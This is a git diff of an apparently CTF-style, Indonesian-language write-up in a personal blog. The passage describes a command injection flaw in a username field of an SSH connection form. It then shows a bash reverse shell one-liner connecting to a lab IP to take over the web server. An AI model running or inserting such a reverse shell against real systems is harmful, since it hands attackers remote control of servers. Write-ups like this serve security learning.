@@ -147,12 +147,12 @@ Disini saya hanya menemukan form untuk koneksi ssh
 ![Screenshot at 2023-09-09 21-32-47](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/f0f08f86-1fff-444e-9aec-336b02ef1761)
 
 ### Comand Injection to RCE
-Pada awalnya saya menemukan kejanggalan saat meneliti form tersebut, disini saya menemukan adanya celah `comand injection` pada parameter username
+Pada awalnya saya menemukan kejanggalan saat meneliti form tersebut, saya menemukan adanya celah `comand injection` pada parameter username
 ![Screenshot at 2023-09-09 21-51-40](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/d65a0897-e4bb-404c-a27f-cbcf5076101d)
 
 Karena saya berhasil melakukan `Comand Injection` lalu tahap berikutnya saya akan melakukan `Reverse Shell` untuk mengambil alih web server tersebut
 
-```sh                                        I      
+```sh     
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.30/4444 0>&1'
 ```
